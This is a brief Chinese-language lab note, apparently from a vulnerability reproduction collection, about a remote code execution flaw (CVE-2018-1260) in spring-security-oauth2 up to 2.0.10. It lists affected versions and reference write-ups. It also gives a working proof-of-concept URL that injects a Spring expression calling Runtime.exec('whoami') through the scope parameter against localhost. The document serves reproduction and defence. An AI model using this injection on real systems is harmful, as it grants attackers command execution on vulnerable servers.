## RCE with spring-security-oauth2【CVE-2018-1260】

测试镜像

* src/spring-security-oauth2/2.0.10

影响版本

* spring-security-oauth2 <= 2.0.10

参考链接

* [RCE with spring-security-oauth2 分析](https://xz.aliyun.com/t/2330)
* [Beware of the Magic SpEL(L) – Part 2 (CVE-2018-1260)](http://gosecure.net/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/)

Poc

访问url：

```
http://127.0.0.1/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com/chybeta&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29%7D
```

在返回的登陆页面随意输入账号密码，点击login，触发命令执行
